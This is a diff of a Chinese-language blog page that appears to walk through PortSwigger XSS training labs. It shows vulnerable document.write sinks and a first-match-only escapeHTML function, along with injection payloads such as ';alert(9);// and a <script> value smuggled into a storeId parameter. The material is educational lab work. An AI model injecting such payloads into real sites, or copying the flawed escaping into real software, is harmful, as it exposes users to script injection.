+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&#x27;ABC&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure>
 <p>构造 Payload<code>';alert(9);//</code></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110690.png" alt="image-20230116175448979"></p>
 <center style="color:#C0C0C0;text-decoration:underline">输入 123 查看出于什么位置</center>
@@ -237,20 +197,7 @@ document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+en
 <h2 id="PRACTITIONER">PRACTITIONER</h2>
 <h3 id="10-文档中的-DOM-XSS-使用源位置编写接收器-在选择元素内搜索">10. 文档中的 DOM XSS.使用源位置编写接收器.在选择元素内搜索</h3>
 <p>注入<code>&amp;storeId=&lt;script&gt;alert()&lt;/script&gt;</code></p>
-<pre><code class="language-js">var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];
-var store = (new URLSearchParams(window.location.search)).get('storeId');
-document.write('&lt;select name=&quot;storeId&quot;&gt;');
-if(store) &#123;
-    document.write('&lt;option selected&gt;'+store+'&lt;/option&gt;');
-&#125;
-for(var i=0;i&lt;stores.length;i++) &#123;
-    if(stores[i] === store) &#123;
-        continue;
-    &#125;
-    document.write('&lt;option&gt;'+stores[i]+'&lt;/option&gt;');
-&#125;
-document.write('&lt;/select&gt;');
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> stores = [<span class="hljs-string">&quot;London&quot;</span>,<span class="hljs-string">&quot;Paris&quot;</span>,<span class="hljs-string">&quot;Milan&quot;</span>];<br><span class="hljs-keyword">var</span> store = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>)).<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;storeId&#x27;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);<br><span class="hljs-keyword">if</span>(store) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="hljs-string">&#x27;&lt;/option&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;stores.<span class="hljs-property">length</span>;i++) &#123;<br>    <span class="hljs-keyword">if</span>(stores[i] === store) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="hljs-string">&#x27;&lt;/option&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;/select&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110089.png" alt="image-20230116181924946"></p>
 <center style="color:#C0C0C0;text-decoration:underline">输入 ABC 查看出于什么位置</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110060.png" alt="image-20230116183055812"></p>
@@ -266,12 +213,7 @@ document.write('&lt;/select&gt;');
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110312.png" alt="image-20230117095234710"></p>
 <h3 id="13-存储型-XSS">13. 存储型 XSS</h3>
 <p>replace()，如果第一个参数是字符串，则仅替换第一个匹配项</p>
-<pre><code class="language-js">function escapeHTML(html) &#123;
-    return html.replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;');
-&#125;
-// 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt;
-// &amp;lt;代表小于号（&lt;）;  &amp;gt;代表大于号（&gt;）  
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">html</span>) &#123;<br>    <span class="hljs-keyword">return</span> html.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt;</span><br><span class="hljs-comment">// &amp;lt;代表小于号（&lt;）;  &amp;gt;代表大于号（&gt;）  </span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110124.png" alt="image-20230117103237719"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062110332.png" alt="image-20230117105708162"></p>
 
